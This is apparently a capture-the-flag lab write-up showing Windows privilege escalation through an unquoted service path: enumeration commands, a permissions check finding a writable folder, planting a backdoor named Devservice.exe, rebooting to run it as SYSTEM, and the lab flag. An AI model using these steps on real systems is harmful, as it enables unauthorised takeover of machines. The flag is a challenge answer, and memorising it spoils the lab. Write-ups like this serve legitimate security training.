
# Quotinent

Clearly, the point of this room: exploiting unquoted service path in Windows for
privilege escalation. First, find the vulnerable service:

```cmd
> wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```
    Developmenet Service
    Development Service
    C:\Program Files\Development Files\Devservice Files\Service.exe
    Auto
```

We're throwing out quoted services and services in C:\Windows\\\\, and selecting only
those with Automatic startmode

Great. We found a potentially vulnerable service. Let's find a writable directory:

```cmd
> icacls "C:\Program Files\\Development Files\\"
```

```
C:\Program Files\\Development Files\
    BUILTIN\Users:(W)
    NT SERVICE\TrustedInstaller:(I)(F)
    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
    NT AUTHORITY\SYSTEM:(I)(F)
    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
    BUILTIN\Administrators:(I)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
    BUILTIN\Users:(I)(RX)
    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
```

Awesome, ***C:\Program Files\\\\Development Files\\\\*** is writable! 

Generate a backdoor, name it ***Devservice.exe*** (first part of the next directory name)
and put in that directory. Next, let's query information about the service configuration:

```cmd
> sc qc "Development Service"
```

```
SERVICE_NAME: Development
Service TYPE : 10 WIN32_OWN_PROCESS
START_TYPE: 2 AUTO_START
ERROR_CONTROL: 1 NORMAL
BINARY_PATH_NAME: C:\Program Files\Development Files\Devservice Files\Service.exe
LOAD_ORDER_GROUP:
TAG: 0
DISPLAY_NAME: Developmenet Service
DEPENDENCIES:
SERVICE_START_NAME: LocalSystem 
```

when the system will boot/reboot, as its start type is AUTO_START, this service will interact with
the Service Control Manager and traverse the path to its binary executable. But instead of the
legitimate service, our backdoor will be executed. Let's reboot the machine and get SYSTEM 
privileges!

```cmd
> shutdown /r /t 0
```

- What is the flag on the Administrator's desktop?

> THM{USPE_SUCCESS}

